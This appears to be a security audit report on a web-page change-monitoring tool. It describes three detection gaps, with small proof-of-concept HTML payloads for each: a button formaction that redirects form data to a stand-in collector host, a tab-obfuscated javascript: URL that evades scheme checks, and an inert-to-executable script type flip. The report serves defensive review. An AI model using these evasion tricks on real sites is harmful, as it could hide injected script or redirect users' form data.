# Audit Round 2 — October 14, 2026

Inspected current files following `Review By GPT 6.1 Sol 14-10-2026.md`, evaluating backend, frontend, capture/review workflows, authorization, and deployment configuration. Because no Git metadata is present in this folder, this review evaluates the file state directly rather than a git commit diff. No application source code was modified during this round; only findings documentation and offline probe scripts were added.

## New Findings

All three items are ranked as **P2**: behavioral detection gaps where page appearance and text remain identical. These do not indicate that the monitoring host was breached or that SSRF guard was bypassed.

### R2-01 — HTTPS Destination in `formaction` Not Evaluated

Location: `backend/app/services/diff/structure.py:114` and `:141–146`

`formaction` is listed under executable URL attributes but is only recorded if it starts with `javascript:`. Meanwhile, HTTP/HTTPS submission endpoints are only extracted from `form.action`. Consequently, adding or editing `button/input.formaction` to redirect form submissions to a different host produces identical structural facts.

Proof of Concept: Starting with `<form action="https://example.com/save"><button>Save</button></form>` and adding `formaction="https://collector.example/save"` on the button: Chromium evaluates the effective submission target as changing from `example.com` to `collector.example`, yet visible text and PNG screenshots remain identical, resulting in a structural change score of `0.0`. (The probe script does not actually submit data or establish outbound connections).

Impact: An unauthorized modification redirecting form submission data may go undetected if other detectors register no difference.

Recommendation: Collect facts for `formaction` on buttons and inputs including relative URLs resolved against base URL, complete with unit tests covering addition/modification/removal and domain allowlist policies.

### R2-02 — JavaScript URLs Containing Embedded Tabs Evade Detection

Location: `backend/app/services/diff/structure.py:114–120`

The check `value.lstrip().lower().startswith('javascript:')` does not normalize embedded tabs or newlines within the scheme according to browser URL handling standards. For example, `href="java&#9;script:void(window.auditProbe=1)"`, after HTML entity decoding, contains an ASCII tab within the scheme, preventing it from being recorded as a JavaScript URL fact and avoiding generating a link-host fact.

Proof of Concept: In Chromium, before the change the link was `href="#"`. After adding the tab-embedded JavaScript link and clicking, `window.auditProbe` was modified to `1`, while visible text and screenshot PNGs remained identical, yielding a structural change score of `0.0`.

Impact: Executable JavaScript injected via tab-encoded URLs may not be flagged, despite prior RV-02 enhancements to JavaScript URL detection.

Recommendation: Strip or normalize ASCII horizontal tabs, LF, and CR characters per browser URL specifications prior to scheme classification, accompanied by tests for literal control characters, entities, and mixed casing, ensuring domain allowlists do not suppress executable URLs.

### R2-03 — Transitioning Script from Inert to Executable Yields Identical Facts

Location: `backend/app/services/diff/structure.py:124–132` and `:252–254`

The structural parser computes a hash of inline script contents but does not record `type` or classify scripts as executable versus inert. Changing `<script type="text/plain">window.auditProbe = 1</script>` to `type="text/javascript"` without modifying the body text produces an identical hash.

Proof of Concept: In Chromium, baseline left the body inert; current executed it, setting `window.auditProbe = 1`. Visible text and screenshot PNGs remained identical, with a structural change score of `0.0`.

Impact: Activating dormant code inside pre-existing inert scripts can evade detection. Similarly, external script facts do not record script `type`, which should be tracked concurrently.

Recommendation: Record normalized script type and executable/inert classification for both inline and external scripts. Include tests for inert→classic/module and reverse transitions, ensuring changes in execution capability trigger a structural diff.

## Reproduction Steps

From the backend directory in PowerShell:

```powershell
$env:PYTHONPATH='.'
.\.venv\Scripts\python.exe scripts/audit_round2_probe.py
```

The probe script instantiates test pages directly in Chromium using `set_content` without navigating to external networks, executing only harmless variable assignments and inspecting the DOM, visible text, and screenshot bytes serialized by Chromium. All three cases produced: `structure_score=0.0`, `same_text=true`, `same_png=true`, with divergent `before_behavior` and `after_behavior`.

When artifacts with matching text, pixels, and structural facts are passed to the diff pipeline, all scores are zero; `run_target_check` reports OK and discards temporary artifacts. Full end-to-end API exploits were not executed for these cases.

## Recent Verification Results

| Check | Result |
| --- | --- |
| Backend pytest (Full suite in project `.venv`, `--basetemp=.audit-r2-full -q`) | **218 passed**, 113 warnings, 125.96s |
| Frontend Vitest | **76 passed**, 12 files |
| Backend Ruff: `app tests scripts alembic` | Passed (probe script also verified clean) |
| Backend mypy: `app` | Passed across 55 source files |
| Frontend ESLint | Passed |
| Frontend production build with TypeScript | Passed |
| Offline Chromium probes | Confirmed all 3 findings |

Passing test suites did not cover the three newly identified edge cases. Frontend logs contain standard React `act(...)` test warnings; backend logs record dependency/model datetime deprecation warnings. Logs are stored in `backend/audit-r2-pytest.log`, `frontend/audit-r2-vitest.log`, and `frontend/audit-r2-build.log`.

Initial sandbox execution encountered Windows temp-directory permissions (`spawn EPERM`). Suites and builds were subsequently executed cleanly with elevated test runner approvals.

## Status of Prior Review Items

RV-01: Baseline approval is enforced across all revisions; scheduler holds pending candidates and approval UI is active.

RV-02: Event handlers and standard JavaScript URLs are checked, though R2-01, R2-02, and R2-03 remain to expand coverage.

RV-03: Navigation errors are re-checked post-readiness and pre-artifact return, including generation/final URL consistency checks; late-navigation regression tests pass.

RV-04: Origin validation verifies effective ports and parses hosts; Nginx configuration forwards `$http_host` and backend restricts trusted proxies. Live Linux deployment remains to be validated.

RV-05 / RV-06 / RV-07: Serialization is uniform across endpoints, and all static checks and test suites currently pass.

RV-08: README specifies short basetemp paths and removes obsolete test counts. Windows verification passed cleanly; live Linux verification remains pending.

## Limitations

Live deployment on Linux, production TLS certificate and reverse proxy behavior, and external dependency advisory audits have not yet been evaluated. This review verifies only the local source code and test executions indicated. Findings from this round have not yet been remediated.
